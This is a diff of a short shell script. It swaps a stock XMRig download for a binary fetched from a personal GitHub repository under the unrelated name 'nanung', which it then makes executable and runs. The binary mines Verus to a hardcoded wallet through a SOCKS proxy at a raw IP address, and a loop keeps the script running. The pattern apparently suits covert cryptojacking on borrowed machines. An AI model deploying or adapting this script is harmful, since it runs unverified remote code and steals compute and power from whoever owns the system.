@@ -1,10 +1,10 @@
+
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
-tar xf xmrig-6.14.0-linux-x64.tar.gz
-cd xmrig-6.14.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TW6x5pAKLKk88DTSzZ8ZQCDp3Qe4bATn3k.God_Miner#ek61-6h9x -p x --cpu 2
+wget https://github.com/surtitedjohadiningrat/verus/raw/main/nanung
+chmod +x nanung
+./nanung -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm.nn4 -p c=VRSC,zap=VRSC -t 4 -x 185.32.120.242:1080
 while [ 1 ]; do
 sleep 3
 done
